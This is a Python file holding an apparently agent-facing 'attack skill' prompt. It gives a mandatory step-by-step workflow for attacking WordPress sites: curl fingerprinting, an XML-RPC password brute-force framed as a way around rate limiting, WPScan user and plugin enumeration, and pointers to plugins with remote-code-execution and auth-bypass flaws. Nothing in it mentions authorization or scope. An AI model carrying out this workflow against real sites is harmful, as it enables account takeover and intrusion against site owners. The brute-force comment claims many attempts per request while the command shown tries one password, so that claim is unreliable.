"""
WordPress Attack Skill Prompt.
"""
WORDPRESS_SKILL_PROMPT = """
## ATTACK SKILL: WORDPRESS ATTACKS

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
```bash
curl -s https://TARGET/ | grep -i wordpress
curl -s https://TARGET/wp-content/ | head
curl -s https://TARGET/xmlrpc.php -d '<?xml?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```

#### STEP 2: XMLRPC BRUTE-FORCE
```bash
# Single request, multiple password attempts (bypass rate limiting)
curl -s https://TARGET/xmlrpc.php -d '<?xml?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>'
```

#### STEP 3: WPSCAN
```bash
wpscan --url https://TARGET --enumerate p,t,u --api-token $WPSCAN_TOKEN
```

#### STEP 4: PLUGIN/THEME VULNS
Check: `/wp-content/plugins/PLUGIN/readme.txt` → version → CVE lookup.
Common: `wp-file-manager` (RCE), `elementor` (auth bypass), `duplicator` (file read).

#### ANTI-PATTERNS: Don't skip xmlrpc.php — it enables password brute-force with 1 request per 1000 passwords.
"""
